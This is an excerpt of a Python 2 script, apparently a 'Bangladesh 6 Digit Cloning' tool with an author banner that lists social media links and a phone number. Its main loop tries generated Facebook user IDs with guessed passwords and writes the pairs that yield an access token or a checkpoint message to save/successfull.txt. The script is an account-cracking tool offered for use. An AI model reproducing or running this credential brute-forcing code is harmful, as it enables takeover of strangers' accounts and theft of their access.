#.       FOYSAL HOSEN 
#.       https://github.com/FOYSAL-404
#.       https://www.facebook.com/I.Fell.Alone.In.Love.07
...
print("\033[0;91mThis Tool's Make By :FOYSAL HOSEN YT")
 
psb('\x1b[1;92mBangladesh 6 Digit Cloning Start please Wait__This tools maked  by FOYSAL HOSEN')
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   :  It`s Foysal'
    print '\033[0;94mFACEBOOK : FOYSAL HOSEN '
    print '\033[0;96mCreator :https://www.facebook.com/I.Fell.Alone.In.Love.07'
    print '\033[0;96mwhatsapp: 01793268786'
    print ''
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[ Mr.FOYSAL-CP\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m [ Mr. FOYSAL-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
    ...
    os.system('python2 Foysal-bd-6digt.py')
